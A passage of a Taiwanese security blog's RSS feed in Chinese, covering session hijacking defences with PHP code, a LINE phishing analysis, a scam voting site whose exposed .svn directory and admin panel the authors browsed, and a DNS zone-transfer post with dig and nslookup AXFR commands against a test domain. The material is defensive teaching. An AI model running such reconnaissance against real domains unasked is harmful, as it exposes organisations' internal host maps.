&lt;p&gt;受害者已經登入網站伺服器，並且取得 Session ID，在連線過程中攻擊者用竊聽的方式獲取受害者 Session ID。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;竊取 Session ID&quot; title=&quot;竊取 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;攻擊者直接使用竊取到的 Session ID 送至伺服器，偽造受害者身分。若伺服器沒有檢查 Session ID 的使用者身分，則可以讓攻擊者得逞。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;偽造 Session ID&quot; title=&quot;偽造 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;禁止將 Session ID 使用 URL (GET) 方式來傳遞&lt;/li&gt;
  &lt;li&gt;設定加強安全性的 Cookie 屬性：HttpOnly (無法被 JavaScript 存取)&lt;/li&gt;
  &lt;li&gt;設定加強安全性的 Cookie 屬性：Secure (只在 HTTPS 傳遞，若網站無 HTTPS 請勿設定)&lt;/li&gt;
  &lt;li&gt;在需要權限的頁面請使用者重新輸入密碼&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;session-fixation-固定-session-id&quot;&gt;Session Fixation (固定 Session ID)&lt;/h4&gt;

&lt;p&gt;攻擊者誘使受害者使用特定的 Session ID 登入網站，而攻擊者就能取得受害者的身分。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;攻擊者從網站取得有效 Session ID&lt;/li&gt;
  &lt;li&gt;使用社交工程等手法誘使受害者點選連結，使用該 Session ID 登入網站&lt;/li&gt;
  &lt;li&gt;受害者輸入帳號密碼成功登入網站&lt;/li&gt;
  &lt;li&gt;攻擊者使用該 Session ID，操作受害者的帳號&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在使用者登入成功後，立即更換 Session ID，防止攻擊者操控 Session ID 給予受害者。&lt;/li&gt;
  &lt;li&gt;禁止將 Session ID 使用 URL (GET) 方式來傳遞&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;session-防護&quot;&gt;Session 防護&lt;/h3&gt;

&lt;p&gt;那要怎麼防範攻擊呢？當然會有人說，會員卡不要掉不就沒事了嗎？當然我們沒辦法確保用戶不會因為各種方式導致 Cookie 遭竊（XSS、惡意程式等），因此最後一道防線就是網站的 Session 保護。一張會員卡上如果沒有任何可識別的個人資料，當然任何人撿去了都可以用。如果上面有照片跟簽名呢？偷走會員卡的人在進入俱樂部的時候，在門口就會因為照片跟本人不符而被擋下來。Session 保護也是一樣，怎麼讓我們的 Session 保護機制也能辨識身分呢？答案是利用每個使用者特有的識別資訊。&lt;/p&gt;

&lt;p&gt;每個使用者在登入網站的時候，我們可以用每個人特有的識別資訊來確認身分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;來源 IP 位址&lt;/li&gt;
  &lt;li&gt;瀏覽器 User-Agent&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;如果在同一個 Session 中，使用者的 IP 或者 User-Agent 改變了，最安全的作法就是把這個 Session 清除，請使用者重新登入。雖然使用者可能因為 IP 更換、Proxy 等因素導致被強制登出，但為了安全性，便利性必須要與之取捨。以 PHP 為例，我們可以這樣撰寫：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;session_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_regenerate_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;除了檢查個人識別資訊來確認是否盜用之外，也可以增加前述的 Session ID 的防護方式：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie 設定 Secure Flag (HTTPS)&lt;/li&gt;
  &lt;li&gt;Cookie 設定 HTTP Only Flag&lt;/li&gt;
  &lt;li&gt;成功登入後立即變更 Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Session 的清除機制也非常重要。當伺服器偵測到可疑的使用者 Session 行為時，例如攻擊者惡意嘗試偽造 Session ID、使用者 Session 可能遭竊、或者逾時等情況，都應該立刻清除該 Session ID 以免被攻擊者利用。&lt;/p&gt;

&lt;p&gt;Session 清除機制時機：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;偵測到惡意嘗試 Session ID&lt;/li&gt;
  &lt;li&gt;識別資訊無效時&lt;/li&gt;
  &lt;li&gt;逾時&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;管理者有避免使用者帳號遭竊的責任&quot;&gt;管理者有避免使用者帳號遭竊的責任&lt;/h3&gt;

&lt;p&gt;使用者帳號遭竊一直以來都是顯著的問題，但卻鮮少有網站針對 Session 的機制進行保護。攻擊者可以輕鬆使用 &lt;a href=&quot;http://codebutler.github.io/firesheep/&quot;&gt;firesheep&lt;/a&gt; 之類的工具竊取帳號。國外已經有不少網站偵測到 Session 可能遭竊時將帳號強制登出，但國內目前還鮮少網站實作此防禦，設備商的 Web 管理介面更少針對 Session 進行保護。如果 VPN Server 等設備有偵測 Session ID 的偽造，在 &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件時就不會有那麼慘重的損失了。&lt;/p&gt;

&lt;p&gt;立刻把自己的網站加上 Session 保護機制吧！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/06/03/http-session-protection/</link>
                <guid>https://devco.re/blog/2014/06/03/http-session-protection</guid>
                <pubDate>Tue, 03 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>LINE 免費貼圖釣魚訊息分析</title>
                <description>&lt;p&gt;晚上突然接到社群朋友傳 LINE 的訊息過來，定睛一看並不單純。這網址看起來就是釣魚網站啊？怎麼會這樣呢？難道是朋友在測試我們的警覺心夠不夠嗎？讓我們看下去這個釣魚網頁怎麼玩。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot; alt=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; title=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;此 LINE 釣魚訊息說只要幫忙轉發 15 次訊息，就會贈送貼圖。先不論 LINE 有沒有這樣的機制，我們先直接點選連結看看葫蘆裡賣什麼藥。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot; alt=&quot;LINE 釣魚假貼圖網頁&quot; title=&quot;LINE 釣魚假貼圖網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;瀏覽器打開之後，跳出了領取貼圖的「網頁」，而且還有詭異的紅字。各種跡象都跟一般領取貼圖的模式不同，太令人起疑了。點了圖就會跳到 Facebook 登入頁面。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot; alt=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; title=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;明眼人看到這個 Facebook 登入頁面就會發現太假了，破綻多多。Logo、網址、網頁格式破板、簡體字，太多令人懷疑的地方了。在這邊我們只要隨便輸入帳號跟密碼，就能到下個畫面。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot; alt=&quot;假 Facebook 登入完成頁面&quot; title=&quot;假 Facebook 登入完成頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;結果當然是不會給你貼圖啦！而且網址「cuowu」是「錯誤」的拼音，也暴露了網站作者的身分。直接用瀏覽器看傳遞的頁面叫做「tj.asp」，「tj」正好是「提交」，畫面上的錯誤訊息更是大剌剌的直接秀出簡體字。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot; alt=&quot;釣魚網站網頁訊息&quot; title=&quot;釣魚網站網頁訊息&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;事後友人直接說 LINE 帳號被盜用發訊息了，而且密碼可能過於簡單、也沒有設定換機密碼。因此在這邊呼籲大家做好 LINE 的安全設定：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;加強密碼長度、複雜度&lt;/li&gt;
  &lt;li&gt;設定「換機密碼」&lt;/li&gt;
  &lt;li&gt;若只在手機使用 LINE，可將「允許自其他裝置登入」關閉&lt;/li&gt;
  &lt;li&gt;如果有帳號被盜狀況，趕快聯絡 LINE &lt;a href=&quot;https://line.naver.jp/cs/&quot;&gt;https://line.naver.jp/cs/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;大家在享受通訊軟體與朋友傳訊貼圖的同時，也必須要注意有心人士利用這些管道竊取你的帳號密碼喔！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/12/line-phishing/</link>
                <guid>https://devco.re/blog/2014/05/12/line-phishing</guid>
                <pubDate>Mon, 12 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>搶搭核四與服貿熱潮的潛在詐騙網站</title>
                <description>&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;

&lt;p&gt;最近很多人都收到了一個看起來很像釣魚網站的核四投票站台簡訊，如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot; alt=&quot;核四投票站台簡訊&quot; title=&quot;核四投票站台簡訊&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我們也收到了，但是剛吃飽飯實在很想睡覺，不太想理他，於是就忍不住趴下睡覺，竟然做了個夢…..&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;站台內容&quot;&gt;站台內容&lt;/h3&gt;

&lt;p&gt;在夢中手滑打開了網頁，內容長得像這個樣子：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot; alt=&quot;核四投票站台頁面&quot; title=&quot;核四投票站台頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看了真是非常的義憤填膺！馬上就想投下神聖的一票！但是忽然聽到周公指示說網站底下有奇怪的目錄，照著神諭一試，發現有 .svn 目錄跟 entries 檔！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot; alt=&quot;.svn 目錄&quot; title=&quot;.svn 目錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;這時候三太子哪吒剛好路過，說他剛剛在 Pastebin 看到有人貼了&lt;a href=&quot;http://pastebin.com/4iEVWh24&quot;&gt;一篇跟這個網站好像有關聯的內容&lt;/a&gt;，講完他就開著水車跑去鎮壓龍宮了。點開那篇內容一看，內容有一些很奇怪的網址，讓人看了就很想點！隨便選了一個 http://vote.tw.am/2N9E6V4E5R4BABC0647469FF213F2D94A27FA/chose_vote.include.php 打開來看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot; alt=&quot;投票項目&quot; title=&quot;投票項目&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;哇塞！原來從服貿就已經開始了呢！讓我們繼續點進去看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot; alt=&quot;投票結果導覽頁面&quot; title=&quot;投票結果導覽頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看起來是個後台，可以瀏覽使用者的投票記錄、留言等資料，那就點個投票記錄來看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot; alt=&quot;投票記錄&quot; title=&quot;投票記錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;果然裡面存著眾多民眾的投票記錄，那麼用戶反饋應該就是留言了…&lt;/p&gt;

&lt;p&gt;從這些內容看來，應該是有個集團擁有大量的民眾個資，並且一一發送訊息給這些人，背後目的尚不得而知。有可能是大陸人想利用這個熱潮確認這些電話號碼是否真實、可用，也有可能是不知名的黑手正在策劃下一個打壓動作？正當我們想搞清楚對方究竟是透過電話號碼還是信箱傳送 iMessage 時，哪吒忽然又路過了，丟了這張圖之後叫我們不要再瞎忙了趕快回家洗洗睡：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/7.scam.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/7.scam.png&quot; alt=&quot;IP、時間、電話、回應內容等資料&quot; title=&quot;IP、時間、電話、回應內容等資料&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;果然有電話！究竟這件事，是有網站大量洩漏個資，還是有人在民運期間利用這股熱潮蒐集個資，抑或是背後有什麼不可告人的秘密呢？讓我們繼續看下去～&lt;/p&gt;

&lt;h3 id=&quot;夢醒時分&quot;&gt;夢醒時分&lt;/h3&gt;

&lt;p&gt;上班時間不能午睡太久，於是周公就把我們叫醒了…..&lt;/p&gt;

&lt;p&gt;對於這樣的夢境我們有以下建議：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;不要隨意點擊來路不明的簡訊內容&lt;/li&gt;
  &lt;li&gt;在網路上填寫任何內容之前先查證該網站是否可疑&lt;/li&gt;
  &lt;li&gt;對於 yijapperj@hotmail.com 這種可疑帳號所傳來的任何資料，請保持高度警戒&lt;/li&gt;
  &lt;li&gt;對於 vote.tw.am 這種看起來疑似要偽裝成 .tw 網域的站台，也請保持高度警戒&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;歡迎大家轉發這個消息到各大網站、粉絲團、BBS，告訴各個熱心公益的鄉民們別再點擊與回應來路不明的簡訊囉！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site/</link>
                <guid>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site</guid>
                <pubDate>Wed, 07 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;DNS&lt;/a&gt; 是在 1983 年由 Paul Mockapetris 所發明，相關規範分別在 &lt;a href=&quot;http://tools.ietf.org/html/rfc1034&quot;&gt;RFC 1034&lt;/a&gt; 以及 &lt;a href=&quot;http://tools.ietf.org/html/rfc1035&quot;&gt;RFC 1035&lt;/a&gt;。其主要作用是用來記憶 IP 位址與英文之間的對應關係，讓人類可以用較簡單的方式記得主機名稱。目前一般民眾大多使用 ISP 或國際知名公司提供的 DNS server，如中華的 168.95.1.1 或是 Google 的 8.8.8.8 等等。&lt;/p&gt;

&lt;p&gt;然而對於企業而言，可能需要架設大量機器或內部系統，又希望以簡單的方式記憶主機名稱，因此許多企業有自行架設 DNS server 的需求。同時企業通常也會建立幾台備援 DNS server，以避免 DNS 服務忽然中斷。但是當企業有多台 DNS server 時，就必須考量 DNS 記錄的同步問題，通常會使用 &lt;a href=&quot;http://en.wikipedia.org/wiki/DNS_zone_transfer&quot;&gt;zone transfer&lt;/a&gt; 這個功能來同步記錄。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;然而若管理者未做好相關設定，使所有來源皆可對企業的 DNS 主機進行 zone transfer 查詢，則有機會讓此功能成為企業遭受攻擊的起點。用現實生活情境舉例的話，對外開放 zone transfer 就如同所有人都可以任意查詢你名下的所有房地產位在何處，假如有人要針對性的攻擊你，隨時都可以去看你某個房地產有沒有哪扇門窗沒關好，伺機入侵你的家園。一般我們對企業資訊系統進行&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;時，在資訊搜集的階段也會先從 domain name 下手，因此 DNS 相關資料的重要性可見一斑。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-1999-0532&quot;&gt;Zone transfer 的資安議題早在 1999 年就已有人提出&lt;/a&gt;，理應成為各企業進行資安稽核的步驟之一。然而十五年過去了，在近期我們卻發現許多國內大企業仍有此問題，令人非常驚訝！究竟企業該如何檢測自身是否存在這種安全漏洞？此問題目前在台灣網路環境佔有多大的比例？Zone transfer 會對企業造成什麼影響？讓我們繼續看下去～&lt;/p&gt;

&lt;h3 id=&quot;zone-transfer-檢測方式&quot;&gt;Zone Transfer 檢測方式&lt;/h3&gt;

&lt;p&gt;首先需感謝 &lt;a href=&quot;http://www.digininja.org/&quot;&gt;DigiNinja&lt;/a&gt; 提供了一個&lt;a href=&quot;http://www.digininja.org/projects/zonetransferme.php&quot;&gt;讓大家自由測試的 zonetransfer.me 網域&lt;/a&gt;，以下我們分別在 Linux 及 Windows 環境下進行檢測。&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;在 Linux 環境內，我們可利用 &lt;a href=&quot;http://linux.vbird.org/linux_server/0350dns.php#dig&quot;&gt;dig&lt;/a&gt; 指令查詢目標 domain 使用哪些 name server：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig +nostats +nocomments +nocmd NS zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Name server 查詢結果：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zonetransfer.me.		IN	NS
zonetransfer.me.	7118	IN	NS	ns12.zoneedit.com.
zonetransfer.me.	7118	IN	NS	ns16.zoneedit.com.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;從結果可得知有 ns12.zoneedit.com 或 ns16.zoneedit.com 這兩個 DNS server，接著我們即可測試是否可從外部網路對這兩個 DNS server 進行 zone transfer，測試方式如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig axfr zonetransfer.me @ns12.zoneedit.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; alt=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從上面的測試結果中我們可發現，zonetransfer.me 這個網域的所有 DNS 設定已全部被列出。&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;若是在 Windows 環境，可在命令提示字元環境內使用 &lt;a href=&quot;http://support.microsoft.com/kb/200525/zh-tw&quot;&gt;nslookup&lt;/a&gt; 指令查詢目標 domain 使用哪些 name server：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ns zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Name server 查詢結果：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
zonetransfer.me	nameserver &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns12.zoneedit.com.
zonetransfer.me	nameserver &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns16.zoneedit.com.

Authoritative answers can be found from:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;輸入指令後我們如同先前使用 dig 一樣，得知目標有 ns12.zoneedit.com 與 ns16.zoneedit.com 這兩個 name server，接著再如下圖依序輸入三道指令查詢：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup

server ns12.zoneedit.com

&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：Linux 版的 nslookup 沒有實作 ls 這個功能喔！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; alt=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;測試結果與 Linux 環境所得到的資料雷同，可成功列出該網域的所有 DNS 設定。&lt;/p&gt;

&lt;h4 id=&quot;online-service&quot;&gt;Online Service&lt;/h4&gt;

&lt;p&gt;當然，並不是每個人都熟悉上述指令的操作方式，因此除了介紹手動檢測方法之外，在這裡也提供幾個線上檢測的服務，讓大家可以迅速檢測自家公司或者你正在使用的服務是否有此問題：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ultratools.com/tools/zoneFileDump&quot;&gt;UltraTools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://hackertarget.com/zone-transfer/&quot;&gt;HackerTarget&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.digitalpoint.com/zone-transfer&quot;&gt;Digital Point&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;實際案例&quot;&gt;實際案例&lt;/h3&gt;

&lt;p&gt;如同上次 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP Headers 資安議題&lt;/a&gt;所探討的對象，我們從 TIEA 成員以及 Alexa TW top 525 觀察 zone transfer 問題分別在這些族群中佔有多少比例。&lt;/p&gt;

&lt;p&gt;根據我們監測的結果，在目前 TIEA 的 132 名成員中，有 20 個網域存在 zone transfer 問題，佔了 15.15%。而在 Alexa TW top 525 當中，有 48 個網域存在 zone transfer 問題，佔了 9.14%。乍看之下比率似乎不高，但是在上述兩個族群的網域當中，包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;電信商&lt;/li&gt;
  &lt;li&gt;多家電視媒體&lt;/li&gt;
  &lt;li&gt;多家網路新聞媒體&lt;/li&gt;
  &lt;li&gt;多家線上購物網站&lt;/li&gt;
  &lt;li&gt;知名團購網站&lt;/li&gt;
  &lt;li&gt;知名金流公司&lt;/li&gt;
  &lt;li&gt;知名線上音樂服務&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;台灣企業不夠注重資訊安全，罔顧客戶資料安全性，早已不是新聞。然而若企業不顧自身商業利益與責任，當彼此無商業往來時，我們也無法一一咎責。但若連台北市政府、教育部、多間大專院校都有此問題，就令人不太能接受了，這些政府單位與教育機構理當為我們的個人資料安全性負起全部的責任，不應該漏掉任何一個資安環節。上述結果顯示出台灣從政府到企業可能都沒有徹底落實 DNS 的資安設定，而且目前的數據僅僅是針對 TIEA 成員以及 Alexa TW top 525 進行檢測，若是對全台灣或是全世界進行大範圍的檢測，恐怕會發現更多驚人的案例！&lt;/p&gt;

&lt;h3 id=&quot;對企業的潛在影響&quot;&gt;對企業的潛在影響&lt;/h3&gt;

